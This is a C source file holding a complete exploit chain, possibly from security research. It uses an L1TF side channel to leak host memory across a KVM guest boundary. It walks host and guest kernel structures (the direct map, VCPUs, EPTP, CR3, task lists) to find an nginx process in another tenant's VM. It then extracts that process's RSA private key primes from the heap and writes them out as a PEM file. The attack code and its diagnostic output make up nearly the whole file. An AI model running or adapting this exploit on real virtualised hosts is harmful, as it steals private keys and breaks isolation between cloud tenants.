{
	fprintf(stderr, "\nguest_find_nginx(base=%lx, eptp=%lx, gcr3=%lx, gtext=%lx, *gdmp=%lx)\n" HLINE, base, eptp, gcr3, gtext, *gdmp);
#if LEAK == SKIP && defined(NGINX) && defined(GDM)
	*gdmp = GDM;
	dump(*gdmp);
	dump(NGINX);
	return NGINX;
#endif
	char comm[TASK_COMM_LEN+1] = {0};
	pid_t pids[2] = {0};
	gva_t task = 0;

	gva_t swapper = gtext + G_TEXT_INIT_TASK;
	dump(swapper);
	int len = strlen("swapper");
	// leak_task(base, 0, eptp, gcr3, swapper, comm, pids, len, 10);
	// if (nr_letters_equal(comm, "swapper") < len/2)
	// 	fprintf(stderr, "\nWARNING! unexpected init's comm (expected: \"%s\", leaked: \"%s\")\n\n", G_INIT_NAME, comm);

	pr_dub("Guest's init task is at %lx.\n", swapper+G_TASK_TASKS);
	hpa_t next_p;
	// TODO: the loop at retry_systemd below can get stuck, if gtext was wrong.
	//	merge guest_text() and start of guest_find_nginx() into a single
	// 	function "break_guest_kaslr()", and sanity check gtext with systemd's comm.
retry_systemd:
	next_p = translate_tdp(base, swapper+G_TASK_TASKS, 0, gcr3, eptp, 0, "   ");
	dump(next_p);
	len = strlen("systemd");
	gva_t systemd = leak_ptr(base, 0, next_p, is_kernel_ptr) - G_TASK_TASKS;
	dump(systemd);
	pr_dub("\n");
	pr_dub("%10lx | struct task_struct { (guest init)\n", next_p-G_TASK_TASKS);
	pr_dub("     +%4x |     struct list_head *tasks.next = %lx\n", G_TASK_TASKS, systemd);

	gva_t systemd_gp = translate_tdp(base, systemd, 0, gcr3, eptp, 1, "           |        ");
	dump(systemd_gp);
	if (systemd_gp == -1UL)
		goto retry_systemd;
	pr_dub("           | };\n");

	gva_t gdm = systemd - systemd_gp;
	// pr_dub("Guest's systemd task is at gva %lx, pointing to gpa %lx.\n", systemd, systemd_gp);
	pr_dub("Since %lx --> %lx, the guest's direct map is at %lx.\n\n", systemd, systemd_gp, gdm);
	*gdmp = gdm;
	dump(gdm);

	pr_dub("Find Nginx Within Guest\n=======================\n");

	leak_task(base, gdm, eptp, gcr3, systemd, comm, pids, len, 10);
	if (nr_letters_equal(comm, "systemd") < len/2) {
		fprintf(stderr, "Unexpected systemd's comm: \"%s\". Retrying...)\n\n", comm);
		goto retry_systemd;
	}

	gva_t entry_v = systemd+G_TASK_CHILDREN;
	hpa_t entry_p;
retry_tasks_p:
	entry_p = translate_tdp(base, entry_v, gdm, gcr3, eptp, 0, NULL);
	if (entry_p == -1UL)
		goto retry_tasks_p;

	len = strlen("nginx");
	list_walk_except(base, gdm, eptp, gcr3, systemd+G_TASK_CHILDREN, entry_v, entry_p, 1) {
		task = entry_v - G_TASK_SIBLING;
		leak_task(base, gdm, eptp, gcr3, task, comm, pids, len, 10);
		if (nr_letters_equal(comm, "nginx") >= 2*len/3)
			break;
	}
	pr_dub("\n");

	dump(task);

#if HELPERS && defined(NGINX)
	fprintf(stderr, "[%s] nginx: %lx, ground truth: %lx\n", task == NGINX ? "OK" : "ERROR", task, NGINX);
	// if (!(task == NGINX)) exit(1);
#endif

	return task;
}

void nginx_leak_key(hpa_t base, gva_t gdm, hpa_t eptp, hpa_t gcr3, gva_t nginx)
{
	fprintf(stderr, "\nnginx_leak_key(base=%lx, gdm=%lx, eptp=%lx, gcr3=%lx, nginx=%lx)\n" HLINE, base, gdm, eptp, gcr3, nginx);
	char *key = malloc(SSLKEY_LEN);

	// Find nginx's CR3.
	pr_dub("Gain Nginx Address Translation Capability\n========================================\n");
#if LEAK == SKIP && defined(NGINX_CR3)
	hpa_t ngcr3 = NGINX_CR3;
#else
	hpa_t nginx_mm_p;
retry_nginx_mm_p:
	nginx_mm_p = translate_tdp(base, nginx+G_TASK_MM, gdm, gcr3, eptp, 0, NULL);
	if (nginx_mm_p == -1UL)
		goto retry_nginx_mm_p;
	dump(nginx_mm_p);
	gva_t gmm = leak_ptr(base, gdm, nginx_mm_p, in_direct_map);
	dump(gmm);

	pr_dub("%10lx | struct task_struct { (guest nginx)\n", nginx_mm_p-G_TASK_MM);
	pr_dub("     +%4x |     struct mm_struct *mm = %lx\n", G_TASK_MM, gmm);
	
	hpa_t nginx_pgd = translate_tdp(base, gmm+G_MM_PGD, gdm, gcr3, eptp, 0, "           |       ");
	dump(nginx_pgd);
	if (nginx_pgd == -1UL)
		goto retry_nginx_mm_p;
	pr_dub("           | };\n\n");
	
	gva_t nginx_cr3 = leak_ptr(base, gdm, nginx_pgd, in_direct_map);
	dump(nginx_cr3);
	if (nginx_cr3 == -1UL)
		goto retry_nginx_mm_p;
	pr_dub("%10lx | struct mm_struct { (guest nginx)\n", nginx_pgd-G_MM_PGD);
	pr_dub("     +%4x |     struct pgd_t *pgd = %lx\n", G_MM_PGD, nginx_cr3);

	hpa_t ngcr3 = translate_tdp(base, nginx_cr3, gdm, gcr3, eptp, 0, "           |       ");
	dump(ngcr3);
	pr_dub("           | };\n\n");

	pr_dub("Root page table of nginx is at hpa %lx.\n\n", ngcr3);
	if (!(0 < ngcr3 && ngcr3 < HOST_MEMORY_SIZE && ((ngcr3 & 0xfff) == 0)))
		goto retry_nginx_mm_p;

	pte_t last_entry;
	for (int i = 0; i < 3; i++)
		last_entry = leak_pte(base, ngcr3+0xff8);
	dump(last_entry);
	dump(gcr3_last_entry);
	if ((last_entry & 0xfff) != 0x067 || hamming_dist(last_entry, gcr3_last_entry) > 5) {
		goto retry_nginx_mm_p;
	}
	fprintf(stderr, "hierzo nu\n");
#endif

	// Find nginx's heap.
	pr_dub("Find Private Key On Nginx's Heap\n================================\n");
#if LEAK == SKIP && defined(SSLKEY_HPA)
	hpa_t sslkey = SSLKEY_HPA;
#else
	int nr_tries_magic = 0;
	hpa_t heap_hpa = nginx_pgd - G_MM_PGD + G_MM_HEAP;
	if ((heap_hpa >> 12) != (nginx_pgd >> 12))
		heap_hpa = translate_tdp(base, gmm+G_MM_HEAP, gdm, gcr3, eptp, 0, NULL);
retry_heap:
	dump(heap_hpa);
	gva_t heap = leak64(base, heap_hpa);
	dump(heap);
	pr_dub("%10lx | struct mm_struct { (guest nginx)\n", nginx_pgd-G_MM_PGD);
	pr_dub("     +%4x |     unsigned long start_brk = %lx\n", G_MM_HEAP, heap);

	// Leak the private key.
	static_assert((NGINX_SSLKEY >> 12) == ((NGINX_SSLKEY+SSLKEY_LEN) >> 12)); // key spread across two pages?
	hpa_t sslkey = translate_tdp(base, heap+NGINX_SSLKEY, gdm, ngcr3, eptp, 0, "           |       ");
	dump(sslkey);
	if (sslkey == -1UL)
		goto retry_heap;
	pr_dub("           | };\n\n");

retry_magic:
	if (++nr_tries_magic > 5) {
		nr_tries_magic = 0;
		goto retry_heap;
	}
	leak(key, base, sslkey, 4);
	display(key, 4);
	if (*(uint32_t *)key != SSLKEY_MAGIC)
		goto retry_magic;

	pr_dub("Nginx's private SSL key is:\n");
	pr_dub("- guest virtually at [%lx, %lx),\n", heap+NGINX_SSLKEY, heap+NGINX_SSLKEY+SSLKEY_LEN);
	pr_dub("- host physically at [%lx, %lx).\n\n", sslkey, sslkey+SSLKEY_LEN);
#endif

	pr_dub("Leak Private Key Nginx\n======================\n");
	pr_dub("prime[0]'s prefix magic found: %08x\n", *(uint32_t *)key);
retry_key:
	leak(key, base, sslkey, SSLKEY_LEN);
	fprintf(stderr, "Leaked SSL key data:\n"); display(key, SSLKEY_LEN);
	if (*(uint32_t *)(key + 4 + 128) != SSLKEY_MAGIC)
		goto retry_key;
	pr_dub("prime[1]'s prefix magic found: %08x\n\n", *(uint32_t *)(key + 4 + 128));

	char *prime[2];
	prime[0] = stringify_bignum(key+4, 128);
	prime[1] = stringify_bignum(key+4+128+4, 128);
	for (int i = 0; i < 2; i++) {
		pr_dub("prime[%d]: %s\n", i, prime[i]);
		pr_dub("According to Miller-Rabin primality tests, prime[%d] is a %s number. %s\n", i, is_prime(prime[i]) ? "prime" : "composite", is_prime(prime[i]) ? "\n" : "Continuing to leak...");
		while (!is_prime(prime[i])) {
			leak(key+4+i*(128+4), base, sslkey+4+i*(128+4), 128);
			free(prime[i]);
			prime[i] = stringify_bignum(key+4+i*(128+4), 128);
			pr_dub("prime[%d]: %s\n", i, prime[i]);
			pr_dub("According to Miller-Rabin primality tests, prime[%d] is a %s number. %s\n", i, is_prime(prime[i]) ? "prime" : "composite", is_prime(prime[i]) ? "\n" : "Continuing to leak...");
		}
	}

        // Convert the two primes into a PEM file and print it to stdout.
        char cmd[0x1000] = {0};
        snprintf(cmd, sizeof(cmd), "./scripts/pem.py %s %s", prime[0], prime[1]);
        assert(system(cmd) == 0);
	pr_dub("\n");

	free(prime[0]);
	free(prime[1]);
	free(key);
}

void task_parents(hpa_t base, hva_t hdm, hpa_t hcr3, hva_t task)
{
	char comm[TASK_COMM_LEN];
	pid_t pids[2] = {0};
	leak_task(base, hdm, 0, hcr3, task, comm, pids, TASK_COMM_LEN, 5);
	while (pids[1] > 10 || pids[1] == 0) {
		hpa_t parent_p = translate(base, task+H_TASK_PARENT, hcr3, hdm, "task %lx ", task);
		hva_t parent = leak_ptr(base, hdm, parent_p, is_kernel_ptr);
		if (leak_task(base, hdm, 0, hcr3, parent, comm, pids, TASK_COMM_LEN, 2))
			task = parent;
	}
}

void task_children(hpa_t base, hva_t hdm, hpa_t hcr3, hva_t task)
{
	char comm[TASK_COMM_LEN];
	pid_t pids[2] = {0};
	// pr_dub("task itself:\n");
	// leak_task(base, hdm, 0, hcr3, task, comm, pids, TASK_COMM_LEN);

	pr_dub("task's children:\n");
	hva_t entry_v = task+H_TASK_CHILDREN;
	hpa_t entry_p = translate(base, entry_v, hcr3, hdm, NULL);
	list_walk_except(base, hdm, 0, hcr3, task+H_TASK_CHILDREN, entry_v, entry_p, 1) {
		hva_t child = entry_v - H_TASK_SIBLING;
		leak_task(base, hdm, 0, hcr3, child, comm, pids, TASK_COMM_LEN, 5);
	}
}

// TODO: LABEL() macros that do counting of the label traversal, so we can cap them and quit upon being stuck

void reverse_gce_task_files_fdt_fd_priv(hpa_t base, hva_t hdm, hpa_t hcr3, hva_t vcpu, hva_t task);

/* Exploit Chain
 * =============
 *
 * Our goals are the following:
 * - Find host's direct map: map -> lapic; brute force lapic's pa.
 * - Leak host's CR3: lapic -> vcpu -> pid -> task -> mm.
 * - Find victim VCPU: vcpu -> kvm -{vm_list}-> kvm -> vcpu_array -> vcpu.
 * - Leak guest's EPTP: vcpu -> arch -> mmu -> info.
 * - Leak guest's CR3: vcpu -> arch -> cr3.
 * - Find guest's kernel text: read from page tables.
 * - Find nginx: text -> init -{tasks,comm}-> nginx.
 * - Leak TSL key: nginx -> mm -> pgd; mm -> heap.
 */
void exploit_chain(hpa_t base)
{
#define pr_la do { fprintf(stderr, "leak_attempts: %5lu, l1tf_cached: %5lu, net-attempts: %5lu\n", leak_attempts-la, l1tf_cached-lc,  (leak_attempts-la)-(l1tf_cached-lc)); la = leak_attempts; lc = l1tf_cached; } while(0)
#define tt do { fprintf(stderr, "took %.1f seconds\n", (clock_read()-t)/1000000000.0); t = clock_read(); } while (0)
	u64 t0 = clock_read();
	u64 t = t0;
	u64 la = 0, lc = 0;

	tt; pr_la; hva_t hdm = host_direct_map(base);
	tt; pr_la; hva_t vcpu_self = own_vcpu(base, hdm);
	tt; pr_la; hva_t task_self = own_task(base, hdm, vcpu_self);
	tt; pr_la; hpa_t hcr3 = host_cr3(base, hdm, task_self);
	tt; pr_la; hva_t task_vic = host_walk_tasks(base, hdm, hcr3, task_self, task_search_victim, 1);
	tt; pr_la; hva_t vcpu_vic = vcpu_via_fds(base, hdm, hcr3, task_vic);
	tt; pr_la; hpa_t eptp = guest_eptp(base, hdm, vcpu_vic);
	tt; pr_la; hpa_t gcr3 = guest_cr3(base, hdm, vcpu_vic, eptp);
	tt; pr_la; gva_t gtext = guest_text(base, eptp, gcr3);
	tt; pr_la; gva_t gdm = 0; gva_t nginx = guest_find_nginx(base, eptp, gcr3, gtext, &gdm);
	tt; pr_la; nginx_leak_key(base, gdm, eptp, gcr3, nginx);
	tt; pr_la;

	pr_dub("Exploit Statistics\n==================\n");
	pr_dub("Total duration:  %6.1f seconds\n", (clock_read()-t0)/1000000000.0);
	pr_dub("Leak attempts:   %6lu bytes\n", leak_attempts);
	pr_dub("L1TF-cache hits: %6lu bytes\n", l1tf_cached);
	pr_dub("L1TF attempts:   %6lu bytes\n", leak_attempts-l1tf_cached);
}

int main(void)
{
	config_print();
	srand(time(NULL));
	set_cpu_affinity(CPU);
	l1tf_init();
	hpa_t base = gadget_base();

	/* TODO:
	 * - private exponent wrong..?
	 * - Sanity check L1TF using 2-byte granular leakage
	 */
	// reverse_around(base, 0x20d528af40+0x940);

	exploit_chain(base);

	// get_feeling_for_kernel_kvm_data_structures();

	return 0;
}
